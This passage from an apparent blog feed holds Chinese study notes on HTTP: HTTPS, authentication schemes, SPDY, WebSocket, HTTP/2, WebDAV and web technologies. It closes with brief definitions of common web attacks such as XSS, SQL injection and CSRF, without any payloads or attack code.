src="https://images.dadream.eu.org/images/2024/07/c4d634280d5777af7ef7eb4b434c7791.png"></p><p>从仅使用服务器端的公开密钥证书（服务器证书）建立 HTTPS 通信的整个过程</p><h4 id="SSL和TLS"><a href="#SSL和TLS" class="headerlink" title="SSL和TLS"></a>SSL和TLS</h4><p>HTTPS 使用 SSL（Secure Socket Layer） 和 TLS（Transport Layer Security）这两个协议。</p><p>SSL目前主导权已转移到IETF，IETF以SSL3.0为基准，后制定了TLS1.0、TLS1.1、TLS1.2。</p><p>当前主流SSL3.0、TLS1.0</p><h5 id="small-tips"><a href="#small-tips" class="headerlink" title="small_tips"></a>small_tips</h5><ul><li><strong>HTTPS</strong> 比 <strong>HTTP</strong> 要慢 <strong>2</strong> 到 <strong>100</strong> 倍</li></ul><h2 id="确认访问用户身份的认证"><a href="#确认访问用户身份的认证" class="headerlink" title="确认访问用户身份的认证"></a>确认访问用户身份的认证</h2><p>某些 Web 页面只想让特定的人浏览</p><h3 id="何为认证"><a href="#何为认证" class="headerlink" title="何为认证"></a>何为认证</h3><p>为了弄清究竟是谁在访问服务 器，就得让对方的客户端自报家门。</p><h4 id="HTTP-1-1-使用的认证方式"><a href="#HTTP-1-1-使用的认证方式" class="headerlink" title="HTTP/1.1 使用的认证方式"></a>HTTP/1.1 使用的认证方式</h4><ul><li><strong>BASIC</strong> 认证（基本认证）</li><li><strong>DIGEST</strong> 认证（摘要认证）</li><li><strong>SSL</strong> 客户端认证</li><li><strong>FormBase</strong> 认证（基于表单认证）</li><li>Windows 统一认证（Keberos 认证、NTLM 认证）</li></ul><h3 id="BASIC-认证（基本认证）"><a href="#BASIC-认证（基本认证）" class="headerlink" title="BASIC 认证（基本认证）"></a><strong>BASIC</strong> 认证（基本认证）</h3><p><img src="https://images.dadream.eu.org/images/2024/07/922d89ad738f1561e68b4dc757c68789.png"></p><p>BASIC 认证虽然采用 Base64 编码方式，但这不是加密处理。不需要任何附加信息即可对其解码。换言之，在HTTP这种非加密信道通信就会被截获。</p><h3 id="DIGEST-认证（摘要认证）"><a href="#DIGEST-认证（摘要认证）" class="headerlink" title="DIGEST 认证（摘要认证）"></a><strong>DIGEST</strong> 认证（摘要认证）</h3><p>DIGEST 认证同样使用质询 / 响应的方式</p><p>所谓质询响应方式是指，一开始一方会先发送认证要求给另一方，接着使用从另一方那接收到的质询码计算生成响应码。最后将响应码返回给对方进行认证的方式。</p><p><img src="https://images.dadream.eu.org/images/2024/07/d2892338940c78fc33f6406e7091220c.png"></p><p>DIGEST 认证提供防止密码被窃听的保护机制，但并不存在防止用户伪装的保护机制。</p><h3 id="SSL-客户端认证"><a href="#SSL-客户端认证" class="headerlink" title="SSL 客户端认证"></a><strong>SSL</strong> 客户端认证</h3><p>SSL 客户端认证是借由 HTTPS 的客户端证书完成认证的方式。凭借客户端证书认证，服务器可确认访问是否来自已登录的客户端。</p><h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><p>步骤 <strong>1</strong>： 接收到需要认证资源的请求，服务器会发送 Certificate Request 报文，要求客户端提供客户端证书。</p><p>步骤 <strong>2</strong>： 用户选择将发送的客户端证书后，客户端会把客户端证书信息以 Client Certificate 报文方式发送给服务器。</p><p>步骤 <strong>3</strong>： 服务器验证客户端证书验证通过后方可领取证书内客户端的公开密钥，然后开始 HTTPS 加密通信。</p><h4 id="SSL-客户端认证采用双因素认证"><a href="#SSL-客户端认证采用双因素认证" class="headerlink" title="SSL 客户端认证采用双因素认证"></a><strong>SSL</strong> 客户端认证采用双因素认证</h4><p>在多数情况下，SSL 客户端认证不会仅依靠证书完成认证，一般会和基于表单认证组合形成一种双因素认证（Two-factor authentication）来使用。换言之，第一个认证因素的 SSL 客户端证书用来认证客户端计算机， 另一个认证因素的密码则用来确定这是用户本人的行为。</p><h4 id="SSL-客户端认证必要的费用（证书）"><a href="#SSL-客户端认证必要的费用（证书）" class="headerlink" title="SSL 客户端认证必要的费用（证书）"></a><strong>SSL</strong> 客户端认证必要的费用（证书）</h4><h3 id="基于表单认证"><a href="#基于表单认证" class="headerlink" title="基于表单认证"></a>基于表单认证</h3><p>客户端会向服务器上的 Web 应用程序发送登录信息（Credential），按登录信息的验证结果认证。</p><h5 id="认证多半为基于表单认证"><a href="#认证多半为基于表单认证" class="headerlink" title="认证多半为基于表单认证"></a>认证多半为基于表单认证</h5><p><strong>Session</strong> 管理及 <strong>Cookie</strong> 应用</p><p><img src="https://images.dadream.eu.org/images/2024/07/2e8062821a51e04c45ae2ac8e7aa8fa1.png"></p><h2 id="基于-HTTP-的功能追加协议"><a href="#基于-HTTP-的功能追加协议" class="headerlink" title="基于 HTTP 的功能追加协议"></a>基于 <strong>HTTP</strong> 的功能追加协议</h2><h4 id="基于-HTTP-的协议"><a href="#基于-HTTP-的协议" class="headerlink" title="基于 HTTP 的协议"></a>基于 <strong>HTTP</strong> 的协议</h4><h4 id="消除-HTTP-瓶颈的-SPDY"><a href="#消除-HTTP-瓶颈的-SPDY" class="headerlink" title="消除 HTTP 瓶颈的 SPDY"></a>消除 <strong>HTTP</strong> 瓶颈的 <strong>SPDY</strong></h4><h5 id="HTTP-瓶颈"><a href="#HTTP-瓶颈" class="headerlink" title="HTTP 瓶颈"></a><strong>HTTP</strong> 瓶颈</h5><p><img src="https://images.dadream.eu.org/images/2024/07/a6c1ddf897e03fc581cd5fd4f7990a4c.png"></p><ul><li><p>Ajax解决</p><p><img src="https://images.dadream.eu.org/images/2024/07/d26bb569fc6c3b4263f786cd14533727.png"></p></li><li><p><strong>Comet</strong> 解决</p><p><img src="https://images.dadream.eu.org/images/2024/07/0bace5d97336e00fd7d4f6932defe557.png"></p></li><li><p>消除 <strong>HTTP</strong> 瓶颈的 <strong>SPDY</strong></p></li></ul><h4 id="SPDY-的设计与功能"><a href="#SPDY-的设计与功能" class="headerlink" title="SPDY 的设计与功能"></a><strong>SPDY</strong> 的设计与功能</h4><p>SPDY 没有完全改写 HTTP 协议，而是在 TCP/IP 的应用层与运输层之间通过新加会话层的形式运作。同时，考虑到安全性问题，SPDY 规定通信中使用 SSL。</p><p>SPDY 以会话层的形式加入，控制对数据的流动，但还是采用 HTTP 建立通信连接。因此，可照常使用 HTTP 的 GET 和 POST 等方 法、Cookie 以及 HTTP 报文等。</p><p><img src="https://images.dadream.eu.org/images/2024/07/fb54f1e32d646b366d829a2c9a887ad3.png"></p><h5 id="新功能"><a href="#新功能" class="headerlink" title="新功能"></a>新功能</h5><ul><li>多路复用流</li><li>赋予请求优先级</li><li>压缩 <strong>HTTP</strong> 首部</li><li>推送功能</li><li>服务器提示功能</li></ul><h4 id="SPDY-大体上消除了-Web-瓶颈"><a href="#SPDY-大体上消除了-Web-瓶颈" class="headerlink" title="SPDY 大体上消除了 Web 瓶颈"></a><strong>SPDY</strong> 大体上消除了 <strong>Web</strong> 瓶颈</h4><h3 id="使用浏览器进行全双工通信的WebSocket"><a href="#使用浏览器进行全双工通信的WebSocket" class="headerlink" title="使用浏览器进行全双工通信的WebSocket"></a>使用浏览器进行全双工通信的<strong>WebSocket</strong></h3><p>WebSocket 网络技术正是为解决这些问题而实现的一套新协议及 API。</p><p> WebSocket 技术主要是为了解决 Ajax 和 Comet 里 XMLHttpRequest 附带的缺陷所引起的问题。</p><h4 id="WebSocket-协议"><a href="#WebSocket-协议" class="headerlink" title="WebSocket 协议"></a>WebSocket 协议</h4><p>一旦 Web 服务器与客户端之间建立起 WebSocket 协议的通信连接， 之后所有的通信都依靠这个专用协议进行。通信过程中可互相发送JSON、XML、HTML 或图片等任意格式的数据。</p><p>由于是建立在 HTTP 基础上的协议，因此连接的发起方仍是客户端， 而一旦确立 WebSocket 通信连接，不论服务器还是客户端，任意一方都可直接向对方发送报文。</p><h5 id="新特点"><a href="#新特点" class="headerlink" title="新特点"></a>新特点</h5><ul><li>推送功能</li><li>减少通信量</li></ul><h4 id="实现-WebSocket-通信"><a href="#实现-WebSocket-通信" class="headerlink" title="实现 WebSocket 通信"></a>实现 WebSocket 通信</h4><p>完成一次握手</p><h5 id="握手请求"><a href="#握手请求" class="headerlink" title="握手请求"></a>握手请求</h5><pre class="line-numbers language-http" data-language="http"><code class="language-http">GET /chat  HTTP/1.1 <span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">server.example.com </span></span><span class="token header"><span class="token header-name keyword">Upgrade</span><span class="token punctuation">:</span> <span class="token header-value">websocket Connection: Upgrade</span></span><span class="token header"><span class="token header-name keyword">Sec-WebSocket-Key</span><span class="token punctuation">:</span> <span class="token header-value">dGhlIHNhbXBsZSBub25jZQ== </span></span><span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://example.com</span></span><span class="token header"><span class="token header-name keyword">Sec-WebSocket-Protocol</span><span class="token punctuation">:</span> <span class="token header-value">chat, superchat </span></span><span class="token header"><span class="token header-name keyword">Sec-WebSocket-Version</span><span class="token punctuation">:</span> <span class="token header-value">13</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用到 HTTP 的 Upgrade 首部字段，告知服务器通信协议发生改变。</p><p>Sec-WebSocket-Key 字段内记录着握手过程中必不可少的键值。Sec-WebSocket-Protocol 字段内记录使用的子协议。</p><h5 id="握手响应"><a href="#握手响应" class="headerlink" title="握手响应"></a>握手响应</h5><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">101</span> <span class="token reason-phrase string">Switching Protocols</span></span><span class="token header"><span class="token header-name keyword">Upgrade</span><span class="token punctuation">:</span> <span class="token header-value">websocket </span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">Upgrade</span></span><span class="token header"><span class="token header-name keyword">Sec-WebSocket-Accept</span><span class="token punctuation">:</span> <span class="token header-value">s3pPLMBiTxaQ9kYGzzhZRbK+xOo= </span></span><span class="token header"><span class="token header-name keyword">Sec-WebSocket-Protocol</span><span class="token punctuation">:</span> <span class="token header-value">chat</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Sec-WebSocket-Accept 的字段值是由握手请求中的 Sec-WebSocket-Key 的字段值生成的。</p><p><img src="https://images.dadream.eu.org/images/2024/07/1c6be636e6391922df500391f6f0a9d2.png"></p><h4 id="WebSocket-API"><a href="#WebSocket-API" class="headerlink" title="WebSocket API"></a>WebSocket API</h4><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> socket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span>'ws<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>game<span class="token punctuation">.</span>example<span class="token punctuation">.</span>com<span class="token operator">:</span><span class="token number">12010</span><span class="token operator">/</span> socket<span class="token punctuation">.</span><span class="token function-variable function">onopen</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span>socket<span class="token punctuation">.</span>bufferedAmount <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> socket<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token function">getUpdateData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="HTTP-2-0"><a href="#HTTP-2-0" class="headerlink" title="HTTP/2.0"></a>HTTP/2.0</h3><h4 id="HTTP-2-0特点"><a href="#HTTP-2-0特点" class="headerlink" title="HTTP/2.0特点"></a>HTTP/2.0特点</h4><table><thead><tr><th>压缩</th><th><strong>SPDY</strong>、<strong>Friendly</strong></th></tr></thead><tbody><tr><td>多路复用</td><td>SPDY</td></tr><tr><td>TLS 义务化</td><td>Speed＋ Mobility</td></tr><tr><td>协商</td><td>Speed＋ Mobility，Friendly</td></tr><tr><td>客户端拉曳（Client Pull）/服务器推送  （Server Push）</td><td>Speed＋ Mobility</td></tr><tr><td>流量控制</td><td>SPDY</td></tr><tr><td>WebSocket</td><td>Speed＋ Mobility</td></tr></tbody></table><p>注：HTTP Speed ＋ Mobility 简写为 Speed ＋ Mobility，Network-Friendly HTTP Upgrade 简写为 Friendly。</p><h3 id="Web-服务器管理文件的-WebDAV"><a href="#Web-服务器管理文件的-WebDAV" class="headerlink" title="Web 服务器管理文件的 WebDAV"></a><strong>Web</strong> 服务器管理文件的 <strong>WebDAV</strong></h3><p>WebDAV（Web-based Distributed Authoring and Versioning，基于万维网的分布式创作和版本控制）是一个可对 Web 服务器上的内容直接进行文件复制、编辑等操作的分布式文件系统。它作为扩展 HTTP/1.1 的协议定义在 RFC4918。</p><p>除了创建、删除文件等基本功能，它还具备文件创建者管理、文件编辑过程中禁止其他用户内容覆盖的加锁功能，以及对文件内容修改的版本控制功能。</p><h4 id="扩展-HTTP-1-1-的-WebDAV"><a href="#扩展-HTTP-1-1-的-WebDAV" class="headerlink" title="扩展 HTTP/1.1 的 WebDAV"></a>扩展 <strong>HTTP/1.1</strong> 的 <strong>WebDAV</strong></h4><p><img src="https://images.dadream.eu.org/images/2024/07/0576a601ec5602848bee1800f36f65f3.png"></p><p>集合（<strong>Collection</strong>）：是一种统一管理多个资源的概念。以集合为单位可进行各种操作。也可实现类似集合的集合这样的叠加。</p><p>资源（<strong>Resource</strong>）：把文件或集合称为资源。</p><p>属性（<strong>Property</strong>）：定义资源的属性。定义以<strong>“</strong>名称 <strong>=</strong> 值<strong>”</strong>的格式执行。</p><p>锁（<strong>Lock</strong>）：把文件设置成无法编辑状态。多人同时编辑时，可防止在同一时间进行内容写入。</p><h4 id="WebDAV-内新增的方法及状态码"><a href="#WebDAV-内新增的方法及状态码" class="headerlink" title="WebDAV 内新增的方法及状态码"></a><strong>WebDAV</strong> 内新增的方法及状态码</h4><p>WebDAV 为实现远程文件管理，向 HTTP/1.1 中追加了以下这些方法。</p><p><strong>PROPFIND</strong> ：获取属性</p><p><strong>PROPPATCH</strong> ：修改属性</p><p><strong>MKCOL</strong> ：创建集合</p><p><strong>COPY</strong> ：复制资源及属性</p><p><strong>MOVE</strong> ：移动资源</p><p><strong>LOCK</strong> ：资源加锁</p><p><strong>UNLOCK</strong> ：资源解锁</p><p>为配合扩展的方法，状态码也随之扩展。</p><p><strong>102 Processing</strong> ：可正常处理请求，但目前是处理中状态</p><p><strong>207 Multi-Status</strong> ：存在多种状态</p><p><strong>422 Unprocessible Entity</strong> ：格式正确，内容有误</p><p><strong>423 Locked</strong> ：资源已被加锁</p><p><strong>424 Failed Dependency</strong> ：处理与某请求关联的请求失败，因此不再维持依赖关系</p><p><strong>507 Isufficient Storage</strong> ：保存空间不足</p><ul><li><p><strong>WebDAV</strong> 的请求实例</p><p>下面是使用 PROPFIND 方法对 <a href="http://www.example.com/file">http://www.example.com/file </a>发起获取属性的请求。</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">PROPFIND /file HTTP/1.1<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">www.example.com</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/xml; charset="utf-8" Content-Length: 219</span></span>&lt;?xml version="1.0" encoding="utf-8" ?&gt;&lt;D:propfind xmlns:D="DAV:"&gt;&lt;D:prop xmlns:R="http://ns.example.com/boxschema/"&gt;&lt;R:bigbox/&gt;&lt;R:author/&gt;&lt;R:DingALing/&gt;&lt;R:Random/&gt;&lt;/D:prop&gt;&lt;/D:propfind&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>WebDAV</strong> 的响应实例</p><p>下面是针对之前的 PROPFIND 方法，返回<a href="http://www.example.com/file">http://www.example.com/file </a>的属性的响应。</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">207</span> <span class="token reason-phrase string">Multi-Status</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/xml; charset="utf-8" Content-Length: 831</span></span>&lt;?xml version="1.0" encoding="utf-8" ?&gt;&lt;D:multistatus xmlns:D="DAV:"&gt;&lt;D:response xmlns:R="http://ns.example.com/boxschema/"&lt;D:href&gt;http://www.example.com/file&lt;/D:href&gt;&lt;D:propstat&gt;&lt;D:prop&gt;&lt;R:bigbox&gt;&lt;R:BoxType&gt;Box type A&lt;/R:BoxType&gt;&lt;/R:bigbox&gt;&lt;R:author&gt;&lt;R:Name&gt;J.J. Johnson&lt;/R:Name&gt;&lt;/R:author&gt;&lt;/D:prop&gt;&lt;D:status&gt;HTTP/1.1 200 OK&lt;/D:status&gt;&lt;/D:propstat&gt;&lt;D:propstat&gt;&lt;D:prop&gt;&lt;R:DingALing/&gt;&lt;R:Random/&gt;&lt;/D:prop&gt;&lt;D:status&gt;HTTP/1.1 403 Forbidden&lt;/D:status&gt;&lt;D:responsedescription&gt; The user does not have acc&lt;/D:responsedescription&gt;&lt;/D:propstat&gt;&lt;/D:response&gt;&lt;D:responsedescription&gt; There has been an access viola&lt;/D:responsedescription&gt;&lt;/D:multistatus&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="构建-Web-内容的技术"><a href="#构建-Web-内容的技术" class="headerlink" title="构建 Web 内容的技术"></a>构建 <strong>Web</strong> 内容的技术</h2><h3 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h3><h5 id="Web-页面几乎全由-HTML-构建"><a href="#Web-页面几乎全由-HTML-构建" class="headerlink" title="Web 页面几乎全由 HTML 构建"></a><strong>Web</strong> 页面几乎全由 <strong>HTML</strong> 构建</h5><h5 id="HTML版本"><a href="#HTML版本" class="headerlink" title="HTML版本"></a>HTML版本</h5><h5 id="设计应用-CSS"><a href="#设计应用-CSS" class="headerlink" title="设计应用 CSS"></a>设计应用 <strong>CSS</strong></h5><h4 id="动态HTML"><a href="#动态HTML" class="headerlink" title="动态HTML"></a>动态HTML</h4><p>使用客户端脚本语言将静态的 HTML 内容变成动态的技术的总称。</p><h5 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h5><p>DOM 是用以操作 HTML 文档和 XML 文档的 API（Application Programming Interface，应用编程接口）。</p><p>Web应用</p><h4 id="通过-Web-提供功能的-Web-应用"><a href="#通过-Web-提供功能的-Web-应用" class="headerlink" title="通过 Web 提供功能的 Web 应用"></a>通过 <strong>Web</strong> 提供功能的 <strong>Web</strong> 应用</h4><p>由程序创建的内容称为动态内容，而事先准备好的内容称为静态内容。</p><h4 id="与-Web-服务器及程序协作的-CGI"><a href="#与-Web-服务器及程序协作的-CGI" class="headerlink" title="与 Web 服务器及程序协作的 CGI"></a>与 <strong>Web</strong> 服务器及程序协作的 <strong>CGI</strong></h4><p>CGI（Common Gateway Interface，通用网关接口）是指 Web 服务器在接收到客户端发送过来的请求后转发给程序的一组机制。在 CGI 的作用下，程序会对请求内容做出相应的动作，比如创建 HTML 等动态内容。</p><p>使用 CGI 的程序叫做 CGI 程序，通常是用 Perl、PHP、Ruby 和 C 等编程语言编写而成。</p><h4 id="因-Java-而普及的-Servlet"><a href="#因-Java-而普及的-Servlet" class="headerlink" title="因 Java 而普及的 Servlet"></a>因 <strong>Java</strong> 而普及的 <strong>Servlet</strong></h4><p>Servlet 是一种能在服务器上创建动态内容的程序。Servlet 是用 Java 语言实现的一个接口，属于面向企业级 Java（JavaEE，Java Enterprise Edition）的一部分。负载小。</p><h3 id="数据发布的格式及语言"><a href="#数据发布的格式及语言" class="headerlink" title="数据发布的格式及语言"></a>数据发布的格式及语言</h3><h4 id="可扩展标记语言"><a href="#可扩展标记语言" class="headerlink" title="可扩展标记语言"></a>可扩展标记语言</h4><p>XML（eXtensible Markup Language，可扩展标记语言）是一种可按应用目标进行扩展的通用标记语言。旨在通过使用 XML，使互联网数据共享变得更容易。</p><p>XML 和 HTML 都是从标准通用标记语言 SGML（Standard Generalized Markup Language）简化而成。与 HTML 相比，它对数据的记录方式做了特殊处理。</p><h4 id="发布更新信息的-RSS-Atom"><a href="#发布更新信息的-RSS-Atom" class="headerlink" title="发布更新信息的 RSS/Atom"></a>发布更新信息的 <strong>RSS/Atom</strong></h4><p>RSS（简易信息聚合，也叫聚合内容）和 Atom 都是发布新闻或博客日志等更新信息文档的格式的总称。两者都用到了 XML。</p><h4 id="JavaScript-衍生的轻量级易用-JSON"><a href="#JavaScript-衍生的轻量级易用-JSON" class="headerlink" title="JavaScript 衍生的轻量级易用 JSON"></a><strong>JavaScript</strong> 衍生的轻量级易用 <strong>JSON</strong></h4><p>JSON（JavaScript Object Notation）是一种以JavaScript（ECMAScript）的对象表示法为基础的轻量级数据标记语言。</p><h2 id="Web-的攻击技术"><a href="#Web-的攻击技术" class="headerlink" title="Web 的攻击技术"></a><strong>Web</strong> 的攻击技术</h2><h3 id="针对-Web-的攻击技术"><a href="#针对-Web-的攻击技术" class="headerlink" title="针对 Web 的攻击技术"></a>针对 <strong>Web</strong> 的攻击技术</h3><h4 id="HTTP-不具备必要的安全功能"><a href="#HTTP-不具备必要的安全功能" class="headerlink" title="HTTP 不具备必要的安全功能"></a><strong>HTTP</strong> 不具备必要的安全功能</h4><h4 id="在客户端即可篡改请求"><a href="#在客户端即可篡改请求" class="headerlink" title="在客户端即可篡改请求"></a>在客户端即可篡改请求</h4><h4 id="针对-Web-应用的攻击模式"><a href="#针对-Web-应用的攻击模式" class="headerlink" title="针对 Web 应用的攻击模式"></a>针对 <strong>Web</strong> 应用的攻击模式</h4><ul><li>主动攻击</li><li>被动攻击</li><li>以服务器为目标的主动攻击</li><li>以服务器为目标的被动攻</li></ul><h3 id="因输出值转义不完全引发的安全漏洞"><a href="#因输出值转义不完全引发的安全漏洞" class="headerlink" title="因输出值转义不完全引发的安全漏洞"></a>因输出值转义不完全引发的安全漏洞</h3><ul><li>客户端的验证</li><li><strong>Web</strong> 应用端（服务器端）的验证<ul><li>输入值验证</li><li>输出值转义</li></ul></li></ul><h4 id="跨站脚本攻击（Cross-Site-Scripting，XSS）"><a href="#跨站脚本攻击（Cross-Site-Scripting，XSS）" class="headerlink" title="跨站脚本攻击（Cross-Site Scripting，XSS）"></a>跨站脚本攻击（Cross-Site Scripting，XSS）</h4><p>跨站脚本攻击（Cross-Site Scripting，XSS）是指通过存在安全漏洞的Web 网站注册用户的浏览器内运行非法的 HTML 标签或 JavaScript 进行的一种攻击。</p><h4 id="SQL-注入（SQL-Injection）"><a href="#SQL-注入（SQL-Injection）" class="headerlink" title="SQL 注入（SQL Injection）"></a>SQL 注入（SQL Injection）</h4><h4 id="OS-命令注入攻击（OS-Command-Injection）"><a href="#OS-命令注入攻击（OS-Command-Injection）" class="headerlink" title="OS 命令注入攻击（OS Command Injection）"></a>OS 命令注入攻击（OS Command Injection）</h4><h4 id="HTTP-首部注入攻击（HTTP-Header-Injection）"><a href="#HTTP-首部注入攻击（HTTP-Header-Injection）" class="headerlink" title="HTTP 首部注入攻击（HTTP Header Injection）"></a>HTTP 首部注入攻击（HTTP Header Injection）</h4><h4 id="邮件首部注入（Mail-Header-Injection）"><a href="#邮件首部注入（Mail-Header-Injection）" class="headerlink" title="邮件首部注入（Mail Header Injection）"></a>邮件首部注入（Mail Header Injection）</h4><h4 id="目录遍历（Directory-Traversal）攻击"><a href="#目录遍历（Directory-Traversal）攻击" class="headerlink" title="目录遍历（Directory Traversal）攻击"></a>目录遍历（Directory Traversal）攻击</h4><h4 id="远程文件包含漏洞（Remote-File-Inclusion）"><a href="#远程文件包含漏洞（Remote-File-Inclusion）" class="headerlink" title="远程文件包含漏洞（Remote File Inclusion）"></a>远程文件包含漏洞（Remote File Inclusion）</h4><h3 id="因设置或设计上的缺陷引发的安全漏洞"><a href="#因设置或设计上的缺陷引发的安全漏洞" class="headerlink" title="因设置或设计上的缺陷引发的安全漏洞"></a>因设置或设计上的缺陷引发的安全漏洞</h3><h4 id="强制浏览（Forced-Browsing）"><a href="#强制浏览（Forced-Browsing）" class="headerlink" title="强制浏览（Forced Browsing）"></a>强制浏览（Forced Browsing）</h4><p>强制浏览（Forced Browsing）安全漏洞是指，从安置在 Web 服务器的公开目录下的文件中，浏览那些原本非自愿公开的文件。</p><h4 id="不正确的错误消息处理（Error-Handling-Vulnerability）"><a href="#不正确的错误消息处理（Error-Handling-Vulnerability）" class="headerlink" title="不正确的错误消息处理（Error Handling Vulnerability）"></a>不正确的错误消息处理（Error Handling Vulnerability）</h4><p>不正确的错误消息处理（Error Handling Vulnerability）的安全漏洞是指，Web 应用的错误信息内包含对攻击者有用的信息。</p><h4 id="开放重定向（Open-Redirect）"><a href="#开放重定向（Open-Redirect）" class="headerlink" title="开放重定向（Open Redirect）"></a>开放重定向（Open Redirect）</h4><p>开放重定向（Open Redirect）是一种对指定的任意 URL 作重定向跳转的功能。而于此功能相关联的安全漏洞是指，假如指定的重定向 URL 到某个具有恶意的 Web 网站，那么用户就会被诱导至那个 Web 网站。</p><h3 id="因会话管理疏忽引发的安全漏洞"><a href="#因会话管理疏忽引发的安全漏洞" class="headerlink" title="因会话管理疏忽引发的安全漏洞"></a>因会话管理疏忽引发的安全漏洞</h3><h4 id="会话劫持（Session-Hijack）"><a href="#会话劫持（Session-Hijack）" class="headerlink" title="会话劫持（Session Hijack）"></a>会话劫持（Session Hijack）</h4><p>会话劫持（Session Hijack）是指攻击者通过某种手段拿到了用户的会话 ID，并非法使用此会话 ID 伪装成用户，达到攻击的目的。</p><h4 id="会话固定攻击"><a href="#会话固定攻击" class="headerlink" title="会话固定攻击"></a>会话固定攻击</h4><p>对以窃取目标会话 ID 为主动攻击手段的会话劫持而言，会话固定攻击（Session Fixation）攻击会强制用户使用攻击者指定的会话 ID，属于被动攻击。</p><h4 id="跨站点请求伪造（Cross-Site-Request-Forgeries，CSRF）"><a href="#跨站点请求伪造（Cross-Site-Request-Forgeries，CSRF）" class="headerlink" title="跨站点请求伪造（Cross-Site Request Forgeries，CSRF）"></a>跨站点请求伪造（Cross-Site Request Forgeries，CSRF）</h4><p>跨站点请求伪造（Cross-Site Request Forgeries，CSRF）攻击是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。</p><h3 id="其他安全漏洞"><a href="#其他安全漏洞" class="headerlink" title="其他安全漏洞"></a>其他安全漏洞</h3><h4 id="密码破解攻击（Password-Cracking）"><a href="#密码破解攻击（Password-Cracking）" class="headerlink" title="密码破解攻击（Password Cracking）"></a>密码破解攻击（Password Cracking）</h4><p>密码破解攻击（Password Cracking）即算出密码，突破认证。</p><h4 id="点击劫持（Clickjacking）"><a href="#点击劫持（Clickjacking）" class="headerlink" title="点击劫持（Clickjacking）"></a>点击劫持（Clickjacking）</h4><p>点击劫持（Clickjacking）是指利用透明的按钮或链接做成陷阱，覆盖在 Web 页面之上。然后诱使用户在不知情的情况下，点击那个链接访问内容的一种攻击手段。这种行为又称为界面伪装（UI Redressing）。</p><h4 id="DoS-攻击（Denial-of-Service-attack）"><a href="#DoS-攻击（Denial-of-Service-attack）" class="headerlink" title="DoS 攻击（Denial of Service attack）"></a>DoS 攻击（Denial of Service attack）</h4><p>DoS 攻击（Denial of Service attack）是一种让运行中的服务呈停止状态的攻击。有时也叫做服务停止攻击或拒绝服务攻击。DoS 攻击的对象不仅限于 Web 网站，还包括网络设备及服务器等。</p><h4 id="后门程序（Backdoor）"><a href="#后门程序（Backdoor）" class="headerlink" title="后门程序（Backdoor）"></a>后门程序（Backdoor）</h4><p>后门程序（Backdoor）是指开发设置的隐藏入口，可不按正常步骤使用受限功能。利用后门程序就能够使用原本受限制的功能。</p>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于hexo插入图片</title>
      <link href="/2021/04/21/guan-yu-hexo-cha-ru-tu-pian/"/>
      <url>/2021/04/21/guan-yu-hexo-cha-ru-tu-pian/</url>
      
